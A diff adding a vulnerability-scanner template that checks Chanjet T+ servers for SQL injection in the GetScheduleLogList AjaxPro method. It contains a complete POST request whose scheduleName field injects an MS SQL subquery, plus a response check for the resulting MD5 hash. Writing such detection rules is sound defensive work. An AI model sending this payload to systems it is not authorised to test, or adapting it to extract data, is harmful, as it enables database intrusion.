@@ -1,0 +1,14 @@
+cve-id: chanjet-tplus-GetScheduleLogList-sqli
+rules:
+- method: POST
+  path: /tplus/ajaxpro/Ufida.T.SM.UIP.ScheduleManage.ScheduleManageController,Ufida.T.SM.UIP.ashx?method=GetScheduleLogList
+  headers:
+    Connection: close
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101
+      Firefox/87.0
+    Accept-Encoding: gzip, deflate
+  body: |
+    {"scheduleName":"' AND 1 IN (SELECT sys.fn_varbintohexstr(hashbytes('MD5','1'))) AND '1'='1"}
+  expression: 'response.body.bcontains(b"0x06d49632c9dc9bcb62aeaef99612ba6b") '
+severity: high
+type: sqli
